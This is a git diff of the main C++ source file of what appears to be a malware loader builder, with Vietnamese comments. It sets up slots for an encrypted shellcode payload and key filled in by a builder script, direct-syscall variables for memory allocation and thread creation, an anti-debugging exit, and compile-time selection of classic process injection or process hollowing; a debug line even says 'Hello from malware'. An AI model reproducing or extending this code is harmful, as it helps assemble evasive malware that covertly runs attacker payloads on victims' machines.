@@ -1,24 +1,40 @@
-// #include <windows.h>
+// src/main.cpp
+
+// Include các tiện ích cốt lõi
 #include "core/utils.h"
-#include "techniques/T_encryption.h"
-#include "techniques/T_injection.h"
-#include "techniques/T_storage.h"
-#include "techniques/T_evasion.h"
 
-/*{{DEFINES}}*/
+// Include file tổng hợp các kỹ thuật (Recipes)
+// File này sẽ tự động include các file con như alloc_local.h, exec_thread.h...
+#include "techniques/recipes.h"
 
-// Placeholders sẽ được builder.py thay thế
-unsigned char shellcode[] = /*{{SHELLCODE}}*/
+// Include các file Storage/Transformation riêng lẻ nếu cần truy cập trực tiếp struct/hàm
+// (Hoặc tốt nhất là recipes.h nên include chúng luôn)
+#include "techniques/1_storage/storage_data.h"
+#include "techniques/3_transformation/crypto_xor.h" 
+#include "techniques/0_anti_analysis/anti_debug.h" 
+
+// --- Dữ liệu do Builder.py sinh ra ---
+
+// 1. Payload (Ciphertext)
+unsigned char shellcode[] = /*{{SHELLCODE}}*/;
 unsigned int shellcode_len = /*{{SHELLCODE_LEN}}*/;
-char* key = /*{{KEY}}*/;
+
+// 2. Key (Byte Array)
+unsigned char key[] = /*{{KEY}}*/;
+unsigned int key_len = /*{{KEY_LEN}}*/;
+
+// 3. AES Nonce (Placeholder cho tương lai)
+// unsigned char nonce[] = /*{{NONCE}}*/;
+// unsigned int nonce_len = /*{{NONCE_LEN}}*/;
 
 PVOID g_syscall_addr = NULL;
 DWORD g_ssn_NtAllocateVirtualMemory = 0;
 DWORD g_ssn_NtCreateThreadEx = 0;
 DWORD g_ssn_NtWaitForSingleObject = 0;
 
-int main(void) {
-
+// --- Entry Point ---
+extern "C" int main() {
+    
     DEBUG_MSG("Start", "Hello from malware");
 
     // --- Initialze ---
@@ -30,26 +46,16 @@ int main(void) {
         }
     #endif
 
-    // 1. STAGE 0: Anti-Analysis
+    // Stage 0: Anti-Analysis (Global Check)
     #ifdef EVASION_CHECKS_ENABLED
-        if (!Stage0_Environment_Check()) return; // Exit if run in sandbox
+        if (IsDebugged()) return;
     #endif
 
-
-    // 2. STAGE 1: Storage Access
-    PayloadInfo payload = Stage1_Access_DataSection();
-
-
-    // 3. STAGE 3 (Part A): Transformation
-    #ifdef ENCRYPTION_XOR
-        Stage3_Decrypt_XOR(&payload);
-    #endif
-
-    // 4. STAGE 2 + 3(Part B) + 4: Injection Recipe
+    // Chọn Recipe dựa trên cờ biên dịch
     #ifdef INJECTION_CLASSIC
-        Inject_Classic(payload.data, payload.length);
+        Recipe_Classic_Injection();
     #elif defined(INJECTION_HOLLOWING)
-        // Inject_ProcessHollowing(payload.data, payload.length);
+        // Recipe_Process_Hollowing();
     #endif
 
     return 0;
